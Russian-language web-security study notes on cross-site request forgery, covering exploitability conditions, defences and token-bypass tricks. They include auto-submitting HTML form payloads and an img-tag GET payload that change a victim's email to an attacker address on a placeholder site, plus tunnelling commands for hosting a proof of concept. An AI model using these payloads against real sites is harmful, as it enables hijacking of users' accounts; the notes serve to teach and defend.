## Условия эксплуатируемости CSRF
- Подходящее действие, которое атакующий хочет выполнить: привилегированные действия (изменение привилегий), изменение пользовательских данных (смена почты, пароля)
- Сессии на основе куки: приложение идентифицирует пользователя, который сделал запрос только по куки
	- CSRF применим не только в случае куки, но и при использовании пользовательских учетных данных в запросе (HTTP Basic authentication и аутентификация на основе сертификата)
- Отсутствие непредсказуемых параметров в запросе, которые атакующий не может знать или угадать
## Пример эксплуатации
1. В веб-приложении содержит функцию для смены почты:
```
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 30 
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE 

email=wiener@normal-user.com
```
2. Атакующий создает сайт, при заходе на который пользователь меняет почту в веб-приложении (если пользователь залогинился на сайте, куки передастся в запрос):
```
<html> 
	<body> 
		<form action="https://vulnerable-website.com/email/change" method="POST"> 
			<input type="hidden" name="email" value="pwned@evil-user.net" /> 
		</form> 
		<script> 
			document.forms[0].submit(); 
		</script> 
	</body> 
</html>
```
## Доставка эксплойта
- POST-запрос: HTML-код размещается на сайте, который контролирует злоумышленник, жертва должна нажать на ссылку.
- GET-запрос: достаточно ссылки на уязвимом сайте `<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`
## Инструменты
- Генераторы CSRF PoC: Burp Suite Professional (Engagement tools / Generate CSRF PoC), [CSRF PoC Generator](https://security.love/CSRF-PoC-Genorator/)
- Страницу с PoC можно запостить с помощью GitHub Pages, [localhost.run](https://localhost.run/) (`python -m http.server 8080`; `ssh -R 80:localhost:8080 nokey@localhost.run`) 
## Способы защиты от CSRF
- CSRF token: уникальный токен, который генерируется на сервере и который пользователь должен добавить к запросу
- SameSite: механизм браузера, определяющий с какого сайта куки, выключенный в запрос
![[SameSite.jpg]]
- Referer-based validation: проверка того, что запрос отправлен с сайта того же домена
## Способы обхода CSRF token
- Смена POST запроса на GET (проверка токена только в запросе POST):
```
<html> 
	<body> 
		<form action="https://vulnerable-website.com/email/change" method="GET"> 
			<input type="hidden" name="email" value="pwned@evil-user.net" /> 
		</form> 
		<script> 
			document.forms[0].submit(); 
		</script> 
	</body> 
</html>
```
- Удаление параметра CSRF token (проверка токена производится только при наличии параметра)
- Использование токена из другой сессии (атакующий может использовать свой токен, так как он не привязан к сессии): 
	- Если токен не привязан к куки и сессии, атакующий может использовать свой токен: сделать новый запрос для генерации нового токена и перехватить запрос
	- Если токен привязан к куки, не не сессионной, атакующий может использовать новый токен в запросе и привязанный куки, который необходимо установить в браузер жертве
- 